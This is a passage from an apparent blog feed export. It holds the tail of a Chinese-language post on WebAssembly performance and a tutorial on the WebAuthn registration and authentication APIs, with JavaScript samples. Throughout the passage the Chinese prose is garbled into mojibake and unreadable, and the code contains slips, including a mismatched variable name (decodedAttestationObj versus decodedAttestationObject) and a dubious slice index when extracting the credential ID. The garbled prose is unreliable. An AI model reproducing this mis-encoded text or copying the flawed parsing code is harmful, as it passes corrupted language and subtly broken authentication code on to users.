WebAssembly å°æ–¼æ•ˆèƒ½çš„å±•ç¾ä¼¼ä¹åˆ°ç›®å‰ç‚ºæ­¢éƒ½æ²’æœ‰è§¸åŠè€¶ï¼Ÿè¦èƒ½å¤ å±•ç¾ JavaScript èˆ‡ WebAssembly çš„æ•ˆèƒ½å·®ç•°å…¶å¯¦æ²’æœ‰é‚£éº¼ç°¡å–®ï¼ŒGuy Bedford åœ¨å½±ç‰‡ä¸­çš„ç¯„ä¾‹æ˜¯åœ¨è¢å¹•ä¸Šç•«å‡ºå¤šå€‹åœ“åœˆï¼Œè¨ˆç®—ä»–å€‘ä¹‹é–“ç¢°æ’çš„ç‹€æ³ä¾†ç§»å‹•ï¼Œæœ‰è¶£çš„æ˜¯ï¼Œç¬¬ä¸€æ¬¡çš„ Demo ä¸­ï¼ŒJavaScript çš„é€Ÿåº¦æ¯” WebAssembly å¯¦ä½œç¢°æ’è¨ˆç®—çš„è¦å¿«å¾—å¤šï¼Œç„¶è€Œåœ¨é‡æ–° optimize æ¼”ç®—æ³•å¾Œï¼Œæ‰è®“ WebAssembly çš„æ•ˆèƒ½æœ‰å¤§å¹…é€²å±•ï¼Œæ¯”èµ· JavaScript å¥½ä¸Šä¸å°‘ï¼ˆåŒæ¨£æ¼”ç®—æ³•ï¼‰
é€™é‚Šæ”¾å€‹å‹•æ…‹æˆªåœ–çµ¦å¤§å®¶çœ‹ï¼Œæƒ³è‡ªå·±è·‘è·‘çœ‹æˆ–æ˜¯çœ‹ç¨‹å¼ç¢¼çš„å¯ä»¥ç§»é§• Guy Bedford çš„ repo - Wasm Demoï¼Œè¼‰ä¸‹ä¾†ç›´æ¥å°±èƒ½æ‰“é–‹ html åŸ·è¡Œå›‰ï¼(è¦åŸ·è¡Œé€™å€‹ Demo éœ€è¦ Chrome Canary ä¸¦åœ¨ chrome:&#x2F;&#x2F;flags ä¸­å•Ÿå‹• Experimental Web Platform Flag)


çµè«–ç›®å‰ wasm åœ¨ Chrome èˆ‡ firefox éƒ½å·²å¯¦ä½œï¼Œé›–ç„¶ä¸€å®šé‚„æœƒæœ‰è¦æ ¼ä¸Šçš„è®Šæ›´ï¼Œä½†äº†è§£ä¸€ä¸‹é€™å€‹å‹¢å¿…æœƒå½±éŸ¿æœªä¾† Web é–‹ç™¼çš„æ±è¥¿æ˜¯æœ‰å¿…è¦çš„ï¼
æœ¬æ–‡ä¹Ÿåªæ˜¯ç°¡å–®ä»‹ç´¹åŸºç¤çš„ä½¿ç”¨æ–¹æ³•ï¼Œå¯¦éš›ä¸Šé‚„æœ‰è¨±å¤šç›¸é—œçš„è­°é¡Œï¼Œåƒæ˜¯ Type Arrays èˆ‡ WebAssembly Web API ç­‰ç­‰ï¼Œéƒ½éœ€è¦æœ‰æ‰€äº†è§£ã€‚ç”šè‡³æ˜¯å¦‚ä½•å°‡å„ç¨®ç¨‹å¼èªè¨€ compile æˆ wasm ä¹Ÿæ˜¯ä¸€é–€å¤§å­¸å•ï¼Œä¹Ÿæœ‰è¨±å¤šæˆ‘æ²’æœ‰æåŠçš„å·¥å…·å¯ä»¥ä½¿ç”¨ï¼ˆå¾è³‡æ–™ä¾†æºä¸­æ‰¾å¾—åˆ°ï¼‰ã€‚
å¸Œæœ›å¤§å®¶çœ‹å®Œå¾Œå¯ä»¥å° WebAssembly çš„ä½¿ç”¨æ–¹å¼æœ‰é»æ¦‚å¿µï¼Œæ–‡ä¸­è‹¥æœ‰ä¸æ¸…æ¥šæˆ–æ˜¯éŒ¯èª¤çš„åœ°æ–¹ä¹Ÿæ­¡è¿æŒ‡æ­£ï¼
è³‡æ–™ä¾†æº
WebAssembly.org
Get Started Using WebAssembly (wasm)
WebAssembly Design
W3C Community Group
WebAssembly ç³»åˆ—ï¼ˆå››ï¼‰WebAssembly å·¥ä½œåŸç†
guybedford&#x2F;wasm-intro
guybedford&#x2F;wasm-demo)

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>Web, WASM, JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€èµ·ä¾†äº†è§£ Web Authentication</title>
    <url>/2019/08/17/webauthn-intro/</url>
    <content><![CDATA[å‰è¨€åœ¨ä»Šå¹´å¹´åˆçš„æ™‚å€™ï¼ŒW3C æ­£å¼å°‡ Web Authentication (WebAuthn) åˆ—å…¥æ­£å¼æ¨™æº–ï¼Œé–‹ç™¼è€…å¯ä»¥é€é API å•Ÿå‹• FIDO 2 é©—è­‰ï¼Œè®“ä½¿ç”¨è€…é€éè¡Œå‹•è£ç½®ã€æŒ‡ç´‹è¾¨è­˜æˆ–ç¡¬é«”å®‰å…¨é‡‘é‘°ä¾†ç™»å…¥å¸³è™Ÿï¼Œä¸éœ€è¼¸å…¥å¯†ç¢¼ï¼
é›–ç„¶ç›®å‰æ”¯æ´åº¦é‚„ä¸é«˜ï¼Œä½†æ—¢ç„¶å·²æˆç‚ºæ¨™æº–ï¼Œæ²’ç†ç”±ä¸ä¾†èªè­˜ä¸€ä¸‹ä½•è¬‚ Web Authenticationï¼Œä»¥åŠæˆ‘å€‘å¯ä»¥å¦‚ä½•ä½¿ç”¨ã€‚ä»Šå¤©å°±ä¸€èµ·ä¾†äº†è§£æˆ‘å€‘èƒ½å¦‚ä½•ä½¿ç”¨ Web Authenticationï¼Œå¢åŠ ç¶²ç«™å®‰å…¨æ€§ï¼Œä¸¦å…é™¤å¯†ç¢¼å¸¶çµ¦æˆ‘å€‘çš„è«¸å¤šéº»ç…©ã€‚
å…ˆå›æ†¶ä¸€ä¸‹æˆ‘å€‘å¹³å¸¸çš„è¨»å†Šç™»å…¥æ–¹å¼ä¸ç®¡æ˜¯æ‰‹æ©Ÿ application æˆ–æ˜¯ç¶²ç«™ï¼Œåªè¦æ˜¯éœ€è¦ç™»å…¥æ“ä½œçš„ï¼Œå‹¢å¿…éƒ½æœƒæä¾›ä¸€å€‹é é¢è®“ä½ è¨»å†Šå¸³è™Ÿèˆ‡å¯†ç¢¼ï¼Œæ¥è‘—ä½ æ‰èƒ½æ‹¿è‘—é€™çµ„å¸³å¯†ç™»å…¥é€²è¡Œä½¿ç”¨ã€‚é€™æ˜¯æˆ‘å€‘ç¿’ä»¥ç‚ºå¸¸çš„ä½¿ç”¨æ–¹å¼ï¼Œä½†éš¨ä¹‹è€Œä¾†çš„å•é¡Œå¤§å®¶ä¹Ÿæ˜¯è¦‹æ€ªä¸æ€ªï¼š

æ¯å€‹ç¶²ç«™éƒ½è¦æƒ³ä¸€çµ„æ–°å¯†ç¢¼ï¼Œè‹¥ç”¨å¤ªå›ºå®šçš„ pattern åˆå®¹æ˜“è¢«çŒœåˆ°ã€‚
å¤ªè¤‡é›œçš„å¯†ç¢¼å®¹æ˜“å¿˜è¨˜ã€‚
è‡ªå·±è¦é˜²ç¯„é‡£é­šç¶²ç«™ã€‚
éœ€è¦æ“”å¿ƒè©²ç¶²ç«™è¢«å…¥ä¾µï¼Œå¯†ç¢¼é­å·ç«Šã€‚

è€Œå¤§ç´„æœ‰ä¸‰æˆå·¦å³å±æ©Ÿæ„è­˜è¼ƒé«˜çš„ä½¿ç”¨è€…æœƒå•Ÿç”¨ 2FA (2 factor authentication)ï¼Œä½†é€™ä½•å˜—ä¸æ˜¯ç‚ºä½¿ç”¨ä¸Šå¸¶ä¾†æ›´å¤šä¸ä¾¿ï¼Ÿ
å› æ­¤ WebAuthn å°±æ˜¯å¸Œæœ›ä¾†è§£æ±ºé€™äº›å•é¡Œï¼Œç‚ºæˆ‘å€‘ä½¿ç”¨è€…æä¾›ä¸€å€‹é™¤äº†å¯†ç¢¼ç™»å…¥ä»¥å¤–çš„é¸é …ã€‚
å†ä¾†èªªæ˜ä¸€ä¸‹åŸºæœ¬è§€å¿µè½åˆ°æ‰€è¬‚å…å¯†ç¢¼ç™»å…¥ï¼Œæ‡‰è©²å¾ˆå®¹æ˜“è¯æƒ³åˆ°æˆ‘å€‘é€é SSH é€£é€²é ç«¯ Server æ™‚ï¼Œå¤§å¤šä¹Ÿæœƒè¨­å®šå…å¯†ç¢¼ç™»å…¥ï¼Œé€éçš„æ˜¯ Public-key cryptography æˆ–åˆç¨± asymmetric cryptographyï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨ç”¢ç”Ÿä¸€çµ„éå°ç¨±çš„åŠ å¯†é‡‘é‘°ï¼šprivate key èˆ‡ public keyï¼Œåˆå¯ç¨±ä½œ credentialï¼Œè®“ä½¿ç”¨è€…è‡ªå·±ä¿ç®¡ private keyï¼Œè€Œæœå‹™ç«¯åˆ©ç”¨ public key ä¾†é©—è­‰ä½¿ç”¨è€…çš„èº«ä»½ã€‚
WebAuthn ä¹Ÿæ˜¯åˆ©ç”¨ç›¸åŒçš„åŠ å¯†åŸç†ä¾†é”æˆå…å¯†ç¢¼çš„ Authenticationã€‚

é€²å…¥ API ç´°ç¯€å‰ï¼Œæˆ‘å€‘ç§‘æ™®ä¸€ä¸‹ï¼ŒWeb Authentication èˆ‡ FIDOå…¶å¯¦å¾ˆå¤šäººæœƒèª¤è§£ï¼Œä»¥ç‚º WebAuthn æŒ‡çš„å°±æ˜¯ä¸Šè¿°åˆ©ç”¨éå°ç¨±åŠ å¯†ä¾†é”åˆ° authentication çš„æŠ€è¡“ï¼Œä½†å¯¦éš›ä¸Šï¼ŒçœŸæ­£è¦ç¯„é€™é …æŠ€è¡“çš„æ˜¯ FIDO2ï¼ŒFIDO2 æ˜¯ FIDO Alliance çš„æœ€æ–°è¦ç¯„ï¼Œè£¡é¢åŒ…å«äº†ä¸€ç³»åˆ—æŠ€è¡“ï¼Œè®“ä½¿ç”¨è€…èƒ½é€éä¸€äº›æ™®é€šçš„è¨­å‚™ï¼Œè¼•æ˜“çš„èˆ‡ç·šä¸Šæœå‹™é€²è¡Œ authenticationï¼Œç„¡è«–æ˜¯ Mobile æˆ–æ˜¯ Desktopã€‚
FIDO2 è¦ç¯„åŒ…å«äº† WebAuthn èˆ‡ Client-to-Authenticator Protocol (CTAP)
ref: fidoalliance.org
ä¹Ÿå°±æ˜¯èªªï¼ŒWebAuthn å…¶å¯¦æ˜¯ FIDO2 çš„ä¸€éƒ¨åˆ†ï¼Œç”¨ä¾†è¦ç¯„æ¨™æº–çš„ Web API è®“ç€è¦½å™¨å¯¦ä½œã€‚
ç›®å‰æ”¯æ´çš„ç€è¦½å™¨æœ‰ Chrome, Firefox, Edge èˆ‡ Safari preview ç‰ˆã€‚å¦å¤–ä¹Ÿå¯ä»¥å†å¤šåƒè€ƒ Duo çš„æ–‡ç« ã€‚
æˆ‘å€‘ç¨å¾®è§£é‡‹ä¸€ä¸‹ä¸Šåœ–ï¼š
ç•¶ä½¿ç”¨è€…åƒæ‡‰ç”¨ç¨‹åºè¦æ±‚è¨»å†Šæˆ–ç™»å…¥æ™‚ï¼Œä½¿ç”¨ FIDO2 çš„æœå‹™ç«¯ (RP App Server) æœƒå‘ŠçŸ¥ç€è¦½å™¨èªªï¼Œæˆ‘å€‘ç¾åœ¨è¦ç”¨ FIDO Authenticationï¼Œè€Œç€è¦½å™¨å‰‡æœƒä½¿ç”¨ WebAuthn APIï¼Œé€é CTAP protocol ä¾†èˆ‡ Authenticator æºé€šï¼Œå­˜å–åˆ°éœ€è¦çš„è³‡è¨Šä¸¦ç”¢ç”Ÿ public key å‚³å›çµ¦æœå‹™ç«¯ã€‚
é€™é‚Šå‡ºç¾å…©å€‹æ–°åè©ï¼šRP app server èˆ‡ Authenticatorã€‚
æ‰€è¬‚çš„ RP (Relying Party)ï¼Œæå¯«çš„å°±æ˜¯è² è²¬è¨»å†Šèˆ‡èªè­‰ä½¿ç”¨è€…çš„çµ„ç¹”æˆ–æ˜¯æœå‹™ï¼ŒåŸºæœ¬ä¸Šæˆ‘è¦ºå¾—å°±æ˜¯ä½ çš„ä¼ºæœå™¨ã€‚
è€Œ Authenticator å°±æ˜¯è² è²¬ç”¢ç”Ÿ credential çš„è»Ÿç¡¬é«”ï¼Œä¾‹å¦‚ï¼šTouchID, YubiKey ç­‰ç­‰ã€‚TouchID é€™ç¨®å­˜åœ¨æ–¼è¨­å‚™å…§éƒ¨çš„ï¼Œå±¬æ–¼ â€œplatformâ€ typeï¼Œè€Œ Yubikey é€™é¡å¤–éƒ¨ç¡¬é«”è¨­æ–½å‰‡å±¬æ–¼ â€œcross-platformâ€ typeã€‚
Web Authentication çš„ä¸»è¦ç‰¹æ€§ï¼š
å¼·å¥çš„å®‰å…¨é«”ç³»ï¼šAuthentication æœ‰å®‰å…¨æ€§ç¡¬é«”ä½œç‚ºæ”¯æ´ï¼Œä¾†å„²å­˜ç§é‘°èˆ‡é€²è¡Œ Web Authentication éœ€è¦çš„åŠ å¯†é‹ç®—ã€‚

æ•ˆç”¨å—åˆ°ä½œç”¨åŸŸè¦ç¯„ï¼šç”¢ç”Ÿçš„ Credential keypair æ˜¯ç¶å®šåœ¨ origin ä¸Šçš„ï¼Œæ„æ€æ˜¯èªªï¼Œè¨»å†Šåœ¨ â€œtechbridge.comâ€ çš„ keypair æ˜¯ä¸èƒ½ç”¨åœ¨ â€œbad-techbridge.comâ€ çš„ç¶²åŸŸä¸Šé ­ï¼Œæ¶ˆé™¤äº†é‡£é­šæ”»æ“Šçš„å±éšªã€‚

å—èªè­‰çš„ï¼ˆAttestedï¼‰ï¼šä¸Šé¢æåˆ°è² è²¬ç”¢ç”Ÿ credential çš„ Authenticators å¯ä»¥æä¾› certificate ä¾†å¹«åŠ©æœå‹™ç«¯é©—è­‰æ‹¿åˆ°çš„ public key æ˜¯ç”±å¯ä¿¡ä»»çš„ authenticators ç™¼å‡ºï¼Œè€Œéæœ‰å®³çš„ä¾†æºã€‚


Web Authentication API - Registeringæ¥è‘—æˆ‘å€‘å¯ä»¥é–‹å§‹ä¾†çœ‹çœ‹å¦‚ä½•ä½¿ç”¨ Web Authentication API ä¾†è¨»å†Šä½¿ç”¨è€… ï¼ˆåƒè€ƒè‡³ Duo çš„ webauthn.guideï¼š
navigator.credentials.create()
é¦–å…ˆï¼ŒServer åˆ©ç”¨ navigator.credentials.create() ä¾†ç”¢ç”Ÿ client çš„ credential
const credential = await navigator.credentials.create(&#123;    publicKey: publicKeyCredentialCreationOptions&#125;);

publicKeyCredentialCreationOptions ä¸­æœ‰ä¸€å † required èˆ‡ optional çš„æ¬„ä½éœ€è¦å¡«å¯«ï¼š
// should generate from serverconst challenge = new Uint8Array(32);window.crypto.getRandomValues(challenge);const userID = &#x27;Kosv9fPtkDoh4Oz7Yq/pVgWHS8HhdlCto5cR0aBoVMw=&#x27;;const id = Uint8Array.from(window.atob(userID), c=&gt;c.charCodeAt(0));const publicKeyCredentialCreationOptions = &#123;    challenge,    rp: &#123;        name: &quot;Tech Bridge&quot;,        id: &quot;techbridge.inc&quot;,    &#125;,    user: &#123;        id,        name: &quot;arvin@techbridge.cc&quot;,        displayName: &quot;Arvin&quot;,    &#125;,    pubKeyCredParams: [&#123;alg: -7, type: &quot;public-key&quot;&#125;],    authenticatorSelection: &#123;        authenticatorAttachment: &quot;platform&quot;,    &#125;,    timeout: 60000,    attestation: &quot;direct&quot;&#125;;

challengeï¼šchallenge æ˜¯ç”± server ç”¢ç”Ÿçš„ä¸€å€‹ bufferï¼Œè£¡é¢å«æœ‰ä¸€ä¸²éš¨æ©ŸåŠ å¯†éçš„ bytesï¼Œç”¨ä¾†é˜²æ­¢ â€œreplay attacksâ€ã€‚é€™é‚Šå–®ç´” demoï¼Œç”¨ Unit8Array èˆ‡ window.crypto.getRandomValues åšå€‹ç¤ºç¯„ã€‚
rpï¼šå…ˆå‰è§£é‡‹éï¼Œä»£è¡¨ â€œrelying partyâ€ï¼ŒæŒ‡çš„å°±æ˜¯è¨»å†Šèˆ‡èªè­‰ä½¿ç”¨è€…çš„ç¶²ç«™ã€‚å…¶ä¸­ï¼Œid ä¸€å®šè¦æ˜¯ç›®å‰ç¶²ç«™çš„ domain çš„ subsetï¼Œåƒæ˜¯å¦‚æœæ˜¯å¾ techbridge.cc è§¸ç™¼ WebAuthn èªè­‰ï¼Œé‚£é€™é‚Šçš„ id å°±å¾—å¡«å¯« techbridge.ccã€‚
userï¼šå°±æ˜¯ç›®å‰æƒ³è¦è¨»å†Šçš„ä½¿ç”¨è€…çš„è³‡è¨Šï¼Œé€™é‚Šçš„ id å¾ˆé‡è¦ï¼Œauthenticator æœƒç”¨é€™å€‹ id ä¾†èˆ‡ credential åšé€£çµï¼Œé€™æ¨£ä¹‹å¾Œæ‰èƒ½é€éä¸€æ¨£çš„ id èˆ‡ä¸€æ¨£çš„ autenticator å»èªè­‰ä½ æ˜¯åŒå€‹ userã€‚è€Œé€™è³‡è¨Šå¯èƒ½æœƒè¢«å­˜åœ¨ authenticator ä¸­ï¼Œä¾æ“šä¸åŒè¼‰å…·èˆ‡å¯¦ä½œæœƒæœ‰ä¸åŒï¼Œä½†æ˜¯å› ç‚ºæœ‰é€™å¯èƒ½æ€§å­˜åœ¨ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸å»ºè­° id å…§è—æœ‰å¯ä»¥èªå‡ºä½ æœ¬èº«çš„ç›¸é—œå€‹äººè³‡è¨Šï¼Œåƒæ˜¯ç”Ÿæ—¥ç­‰ç­‰çš„ã€‚
pubKeyCredParamsï¼šé€™å€‹ array ç”¨ä¾†æè¿° Server æ”¯æ´å“ªäº› types çš„ public key (signing algorithms) ã€‚ç›®å‰ FIDO2 servers æˆæ¬Šæ”¯æ´ RS1ã€RS256 èˆ‡ ES256ã€‚ alg çš„æ•¸å­—å°æ‡‰å¯ä»¥å¾ COSE å»æ‰¾ã€‚
authenticatorSelection (optional)ï¼šå¯ä»¥ç”¨ä¾†é™åˆ¶ Relying parties æ”¯æ´çš„ authenticators ç¨®é¡ï¼Œåƒé€™é‚Šæˆ‘æŒ‡å®š platformï¼Œå°±æ˜¯ Touch ID ä¹‹é¡å…§å»ºçš„ authenticatorsã€‚
timeout (optional)ï¼šä»¥ milliseconds ç‚ºå–®ä½ï¼Œè¡¨ç¤ºèªªå¦‚æœä½¿ç”¨è€…åœ¨é€™æ®µ timeout æ™‚é–“å…§æ²’æœ‰å›æ‡‰ prompt çš„è©±ï¼Œå°±æœƒå›å‚³èªè­‰å¤±æ•—ã€‚
attestation (optional)ï¼šattestation data æ˜¯å¾ authenticator å›å‚³çš„å…§å®¹ï¼Œserver å¯ä»¥ç”¨é€™å€‹é¸é …ä¾†æ±ºå®šè¦è·Ÿ authenticators æ‹¿å¤šå°‘è³‡è¨Šï¼Œæœ‰ä¸‰ç¨®é¸é …ï¼šnoneã€indirect èˆ‡ directã€‚none æŒ‡çš„æ˜¯ server ä¸åœ¨æ„ attestation è³‡æ–™ï¼›indirect è¡¨ç¤ºé¡˜æ„åªæ‹¿åŒ¿åçš„ attestation è³‡æ–™ï¼›è€Œ direct ä»£è¡¨è¦æ±‚ authenticator å›å‚³æ‰€æœ‰ attestation dataã€‚
çœ‹äº†ä¸€äº›ç¨‹å¼ç¢¼ï¼Œä¾†å˜—è©¦ä¸€ä¸‹å§ç¾åœ¨æ‰“é–‹ç€è¦½å™¨çš„ consoleï¼ŒæŠŠä¸Šé¢é‚£æ®µ code è¤‡è£½ä¸Šå»ï¼Œç„¶å¾Œä½ æœƒç™¼ç¾ä»€éº¼äº‹éƒ½æ²’ç™¼ç”Ÿï¼Ÿï¼
å› ç‚ºä¸Šé¢é‚£æ®µ code ç•¶ä¸­ï¼Œæˆ‘å€‘åœ¨ rp ä¸­çš„ id æœ‰æŒ‡å®š techbridge.incï¼Œè€Œé€™ä¸¦éä½ ç›®å‰æ‰€åœ¨çš„ domainï¼Œå› æ­¤ç„¡æ³•å•Ÿç”¨ WebAuthnã€‚
ä¿®æ”¹ä¸€ä¸‹ï¼Œå°‡ rp ä¸­çš„ id ç§»é™¤ï¼Œå†è©¦ä¸€æ¬¡ï¼š

å°±å¯ä»¥ credentials äº†ï¼
å¦å¤–ï¼Œå› ç‚ºæˆ‘å€‘åœ¨ authenticatorSelection.authenticatorAttachment ä¸­æœ‰æŒ‡å®š platformï¼Œæ‰€ä»¥ç•¶æˆ‘å€‘ä¸€è«‹æ±‚ credential å¾Œï¼ŒChrome æœƒç›´æ¥è·³å‡º prompt è¦æ±‚ä½¿ç”¨ TouchIDï¼ˆä¸Šé¢å‡ºç¾ codepen.io æ˜¯å› ç‚ºæˆ‘åœ¨ codepen.io çš„é é¢ console æ¸¬è©¦ï¼š

ä½†å¦‚æœä»Šå¤©ä½ æ²’æœ‰æŒ‡å®šï¼Œæˆ–æ˜¯æŒ‡å®šç‚º cross-platformï¼Œå‰‡æœƒé¡¯ç¤ºå¦‚ä¸‹å…©ç¨® promptï¼š
cross-platformï¼š
æœƒè¦æ±‚ä½ æ’å…¥å¯¦é«” usb keyã€‚

ä¸æŒ‡å®šï¼š
ä½ æœ‰å…©ç¨®é¸é …å¯ä»¥é¸æ“‡ï¼Œä½¿ç”¨ TouchID æˆ–æ˜¯å¯¦é«” usb keyã€‚

Parsing èˆ‡ Validating è¨»å†Šè³‡æ–™å¾å‰›å‰›çš„ç¯„ä¾‹å¯ä»¥çœ‹åˆ°ï¼Œå‘¼å« navigator.credentials.create å¾Œæœƒå›å‚³ä¸€å€‹ credential ç‰©ä»¶ï¼š
console.log(credential);PublicKeyCredential &#123;    id: &#x27;ADSUllKQmbqdGtpu4sjseh4cg2TxSvrbcHDTBsv4NSSX9...&#x27;,    rawId: ArrayBuffer(59),    response: AuthenticatorAttestationResponse &#123;        clientDataJSON: ArrayBuffer(121),        attestationObject: ArrayBuffer(306),    &#125;,    type: &#x27;public-key&#x27;&#125;

å…¶ä¸­ï¼š
idï¼šä»£è¡¨ç”¢ç”Ÿçš„ credentialï¼Œåœ¨å° user é€²è¡Œ authentication æ™‚ï¼Œç”¨æ­¤ id ä¾† identify user credentialï¼Œæ˜¯ base64-encoded stringã€‚
rawIdï¼šåŒä¸Šï¼Œåªæ˜¯æ˜¯ binary formã€‚
response.clientDataJSONï¼šæ˜¯ç€è¦½å™¨ç”¢ç”Ÿçš„ä¸€çµ„è³‡æ–™ï¼ŒåŒ…å« originã€challenge ç­‰ç­‰ï¼Œé€™å€‹è³‡æ–™é‡è¦åœ¨æ–¼å¯ä»¥ç”¨ä¾†é˜²æ­¢ phishing attempã€‚æ­¤å¤–ï¼Œå…§å®¹æ˜¯ç”± authenticator åŠ å¯†éçš„ã€‚
response.attestationObjectï¼šåŒ…å«äº† credential public keyã€optional attestation certificate èˆ‡å…¶ä»– metadataï¼Œç”¨ CBOR encoded éçš„ binary dataã€‚
æ‹¿åˆ° PublicKeyCredential å¾Œï¼Œå°±å¯ä»¥é€åˆ° Server ç«¯å»é€²è¡Œé©—è­‰èˆ‡å¾ŒçºŒå‹•ä½œã€‚
WebAuthn è¦ç¯„ä¸­æœ‰æè¿°äº†ä¸€ç³»åˆ—é©—è­‰ registration data çš„ç¨‹åºï¼Œè€Œå¯¦ä½œéƒ¨åˆ†å‰‡èˆ‡ä½ ç”¨ä»€éº¼èªè¨€æœ‰æ‰€ä¸åŒï¼Œå¯ä»¥åƒè€ƒ Duo Labs çš„ Go èˆ‡ Python ç‰ˆæœ¬ã€‚
é€™é‚Šä»¥ JavaScript ç‚ºä¾‹èªªæ˜ï¼š
é¦–å…ˆï¼ŒServer ç«¯éœ€è¦å…ˆè§£æ clientDataJSONï¼š
// decode the clientDataJSON into a utf-8 stringconst utf8Decoder = new TextDecoder(&#x27;utf-8&#x27;);const decodedClientData = utf8Decoder.decode(    credential.response.clientDataJSON)// parse the string as an objectconst clientDataObj = JSON.parse(decodedClientData);console.log(clientDataObj)&#123;    challenge: &quot;ZVTQWf9y7JkEjKFH-iWiKL4FTtTrQJwhYt2kiJQlcM8&quot;    origin: &quot;https://codepen.io&quot; // again, å› ç‚ºæˆ‘åœ¨ codepen.io çš„é é¢ console æ¸¬è©¦ï¼Œæ‰€ä»¥ origin æ‰æœƒæ˜¯é€™å€‹    type: &quot;webauthn.create&quot;&#125;

é€™é‚Šæˆ‘å€‘æ‹¿å‡º challengeã€origin èˆ‡ type ä¾†é©—è­‰ï¼Œchallenge æ‡‰è©²è¦èˆ‡ç•¶åˆ Server ç”¢ç”Ÿçš„ä¸€è‡´ã€origin è¦æ­£ç¢ºï¼Œä¸” type è¦ç¢ºå®šç‚º createï¼Œæ‰èƒ½ä»£è¡¨æ˜¯åœ¨è¨»å†Šä½¿ç”¨è€…ã€‚å¦‚æ­¤ä¾†é¿å…é‡£é­šèˆ‡ replay attacksã€‚
æ¥è‘—ï¼Œè™•ç† attestationObjectï¼Œç”±æ–¼æ˜¯ç”± CBOR encodeï¼Œæ‰€ä»¥éœ€è¦é¡å¤–æ‰¾ lib ä¾† decodeï¼š
// éœ€è¦æ‰¾å€‹ CBOR lib ä¾† decodeconst decodedAttestationObj = CBOR.decode(credential.response.attestationObject);console.log(decodedAttestationObj);&#123;    authData: Uint8Array(196),    fmt: &quot;fido-u2f&quot;,    attStmt: &#123;        sig: Uint8Array(70),        x5c: Array(1),    &#125;,&#125;

è§£ç¢¼å‡ºä¾†å¾Œçš„ attestationObject å«æœ‰å¹¾é …è³‡è¨Šï¼š

authDataï¼šauthData é€™å€‹ byte array åŒ…å«è‘—æ‰€æœ‰ registration event çš„ metadataï¼Œä»¥åŠ public keyã€‚

fmtï¼šé€™å€‹æ˜¯åŒ…å«è‘— attestation çš„ formatï¼Œå¦‚æœä½ åœ¨ create credentials æ™‚æœ‰è¦æ±‚ Authenticators æä¾› attestation dataï¼Œé‚£ server å¯ä»¥å¾é€™å€‹æ¬„ä½çŸ¥é“è©²å¦‚ä½• parse èˆ‡ validate attestation dataã€‚

attStmtï¼šé€™å°±æ˜¯è¦æ±‚ä¾†çš„ attestation dataï¼Œæ ¹æ“š fmt çš„ä¸åŒæœƒæœ‰ä¸åŒçš„çµæ§‹ï¼Œä»¥é€™é‚Šç¯„ä¾‹ç‚ºä¾‹ï¼Œæˆ‘å€‘æ‹¿åˆ°çš„æ˜¯ä¸€å€‹ signature èˆ‡ x5c certificateï¼Œservers å¯ä»¥ç”¨é€™è³‡æ–™ä¾†é©—è­‰ publickey æ˜¯ä¸æ˜¯ä¾†è‡ªé æœŸçš„ authenticatorï¼Œæˆ–æ˜¯æ ¹æ“š authenticator çš„è³‡è¨Šè€Œ reject authenticate (åƒæ˜¯è¦ºå¾—ä¸èƒ½ä¿¡ä»»è©² certifacateï¼Œç­‰ç­‰)


æœ€å¾Œå¯ä»¥å¾ authData ä¸­å–å¾—æ›´å¤šè³‡æ–™ï¼šcredentialIdã€publicKeyBytesã€publicKeyObject ç­‰ç­‰ï¼š
const &#123;authData&#125; = decodedAttestationObject;// get the credential IDconst credentialId = authData.slice(55, credentialIdLength);// get the public key objectconst publicKeyBytes = authData.slice(55 + credentialIdLength);// the publicKeyBytes are encoded again as CBORconst publicKeyObject = CBOR.decode(publicKeyBytes.buffer);

æ•´å€‹ Validation process å®Œæˆå¾Œï¼ŒServer å°±èƒ½å°‡ publicKeyBytes èˆ‡ credentialId å­˜é€²è³‡æ–™åº«ï¼Œèˆ‡ä½¿ç”¨è€…é—œè¯èµ·ä¾†ã€‚
åˆ°é€™é‚Šç‚ºæ­¢ï¼Œæˆ‘å€‘èµ°å®Œäº† Registering çš„æµç¨‹ã€‚è€Œå‰›å‰›éƒ½æ˜¯ç›´æ¥åœ¨ console è²¼å…¥ç¨‹å¼ç¢¼ï¼Œå¦‚æœæƒ³çœ‹ç¨å¾®â€çœŸå¯¦â€œä¸€é»çš„ç¯„ä¾‹ï¼Œå¯ä»¥åˆ° https://herrjemand.github.io/FIDO2WebAuthnSeries/WebAuthnIntro/makeCredExample.html é€™å€‹ç¶²å€ç©ç©çœ‹ï¼Œé»é¸ button è¨»å†Šçš„æµç¨‹ã€‚

æ¥è‘—ï¼Œå†åŠªåŠ›ä¸€ä¸‹ï¼Œçœ‹çœ‹ Authenticatingï¼Œä¹Ÿå°±æ˜¯ç™»å…¥æ™‚è¦èµ°çš„æ­¥é©Ÿå§ï¼
Web Authentication API - AuthenticatingAuthenticated çš„éç¨‹ä¸­ï¼Œä½¿ç”¨è€…æœƒç”¨å…¶æŒæœ‰çš„ private key ç°½ä¸Šä¸€å€‹ signature åˆ° assertion ä¸Šé ­ï¼Œä¸¦å‚³çµ¦ serverï¼Œserver å‰‡åˆ©ç”¨ public key ä¾†é©—è­‰è©² signatureã€‚
navigator.credentials.get()
Authentication çš„éç¨‹åœ¨æ–¼ä½¿ç”¨è€…è¦è­‰æ˜ä»–å€‘æ“æœ‰è¨»å†Šæ™‚æ‰€æäº¤çš„ key pair ä¸­çš„ private keyã€‚è­‰æ˜æ–¹æ³•ç‚ºåˆ©ç”¨ navigator.credentials.get() å–å¾—è¨»å†Šæ™‚çš„ credentialï¼Œä¸¦é™„ä¸Š signatureã€‚
const credential = await navigator.credentials.get(&#123;    publicKey: publicKeyCredentialRequestOptions&#125;);

const challenge = new Uint8Array(32);window.crypto.getRandomValues(challenge);const publicKeyCredentialRequestOptions = &#123;    challenge,    allowCredentials: [&#123;        id: credentialId, // from registration        type: &#x27;public-key&#x27;,        transports: [&#x27;usb&#x27;, &#x27;ble&#x27;, &#x27;nfc&#x27;],    &#125;],    timeout: 60000,&#125;const assertion = await navigator.credentials.get(&#123;    publicKey: publicKeyCredentialRequestOptions&#125;);

